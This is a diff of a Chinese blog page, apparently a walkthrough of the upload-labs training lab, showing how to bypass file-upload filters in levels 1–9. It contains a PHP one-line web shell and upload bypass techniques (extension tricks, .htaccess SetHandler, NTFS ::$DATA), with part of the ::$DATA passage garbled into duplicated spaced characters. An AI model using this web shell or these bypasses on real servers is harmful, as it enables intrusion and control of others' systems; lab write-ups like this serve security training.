@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/22/page-31/">uploadlabs 1-4</a>
+      <a class="article-title" href="/2021/02/22/page-31/">uploadlabs 1-7</a>
     </h1>
   
 
@@ -90,22 +90,31 @@
 <p>用burp 和火狐 两个配合一下很快</p>
 <p>先写个一句话木马**<?php @eval($_POST['1']) ?>**  这个post[‘’] 框框里面的自己填什么都行</p>
 <p><img src="https://img-blog.csdnimg.cn/20200716013408800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>第一关上传嘛 上传东西 刚才那个一句话木马先另存为格式为jpg 才过的去这关</p>
+<p><strong>第一关</strong>上传嘛 上传东西 刚才那个一句话木马先另存为格式为jpg 才过的去这关</p>
 <p>然后burp抓个包 改一下这个格式 .php 然后中国菜刀链接一下 <a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/.php">http://127.0.0.1/upload-labs/upload/.php</a>  1</p>
 <p>获取权限了就可以控制这电脑了 </p>
-<p>第二关 和第一关差不多只不过type要改成这边允许的类型’image/jpeg 或者 image/png’等等</p>
+<p><strong>第二关</strong> 和第一关差不多只不过type要改成这边允许的类型’image/jpeg 或者 image/png’等等</p>
 <p>那还是老样子另存改个格式 之后抓包改为.php</p>
-<p>第三关这回没法直接抓包改为.php了 稍稍微改一下 .php3 .phtml</p>
+<p><strong>第三关</strong>这回没法直接抓包改为.php了 稍稍微改一下 .php3 .phtml</p>
 <p>就把.php后面加个数字  但是得先去apache那边的配置文件添加一下</p>
 <p>配置文件打开找到一行addtype application/x-httpd-php .php .phtml .php3 .php4 就是把这类后缀的文件解析成php  老样子另存. jpg 之后上传时抓包改格式为.php3 然后菜刀连接一下就可以了 关于php3的介绍</p>
 <p><img src="https://img-blog.csdnimg.cn/20200716102620257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20200716015655108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>第四关就太狠了把都给过滤掉了 用一个别的叫做htaccess </p>
+<p><strong>第四关</strong>就太狠了把都给过滤掉了 用一个别的叫做htaccess </p>
 <p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置</p>
 <p>先创建一个.htaccess格式的文件 记事本打开写点东西进去</p>
 <p>SetHandler application/x-httpd-php  这串</p>
 <p>这样就可以把所有文件当成php执行 </p>
 <p>burp抓包时改一下删掉名字就留下格式 然后把那个.jpg上传上去就可以了 菜刀一连就行了</p>
+<p><strong>第五关</strong> 没有之前的那样子{$file_ext = strtolower($file_ext); //转换为小写} 和前几关的源码对比发现少了这句 </p>
+<p>那么就是说可以用大小写混合绕过去 结果是可以这么干</p>
+<p><strong>第六关</strong> $file_ext = trim($file_ext); //首尾去空 少了这句代码 那么就可以改一下burp截个包 改格式. php php前多个空格 </p>
+<p>**第七关 **$file_name = deldot($file_name);//删除文件名末尾的点 少了这句代码那么上传时可以用.php. 绕过限制</p>
+<p><strong>第八关</strong>  首先来了解一个东西  ::D A T A : N T F S 文 件 系 统 包 括 对 备 用 数 据 流 的 支 持 。 主 要 包 括 提 供 与 M a c i n t o s h 文 件 系 统 中 的 文 件 的 兼 容 性 。 备 用 数 据 流 允 许 文 件 包 含 多 个 数 据 流 。 每 个 文 件 至 少 有 一 个 数 据 流 。 在 W i n d o w s 中 ， 此 默 认 数 据 流 称 为 ： DATA: NTFS文件系统包括对备用数据流的支持。主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：DATA:NTFS文件系统包括对备用数据流的支持。主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<br>DATA。<br>简单讲就是在php+windows的情况下：如果文件名+”::D A T A “ 会 把 : : DATA”会把::DATA”会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。 这关$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA 少了这串代码 那么上传时在burp中这儿</p>
+<p>Content-Disposition: form-data; name=”upload_file”; filename=”yijuhua.jpg**::$DATA**”<br>Content-Type: image/jpeg</p>
+<?php  @eval($_POST['1']);?><p>  首先标配嘛改格式 然后php后面加个::$DATA 就可以上传成功然后连接</p>
+<p><strong>第九关</strong> 认真看了下源码发现其实这些去头去末尾的操作好像是按顺序来的那么末尾多打几个东西说不定就能耗死这些代码┗|｀O′|┛   nice  那么就抓包改一下格式 .php. ..  然后居然可以上传成功 连接一下就可以了</p>
+<p>那按这么说前面那些也可以这么搞  卧槽┗|｀O′|┛ 嗷~~ <strong>真的可以1-9 都可以这样弄</strong>.php. .. (一个点一个空格两个点)    </p>
 
       
     </div>
@@ -574,7 +583,7 @@
       <ul>
         
           <li>
-            <a href="/2021/02/22/page-31/">uploadlabs 1-4</a>
+            <a href="/2021/02/22/page-31/">uploadlabs 1-7</a>
           </li>
         
           <li>
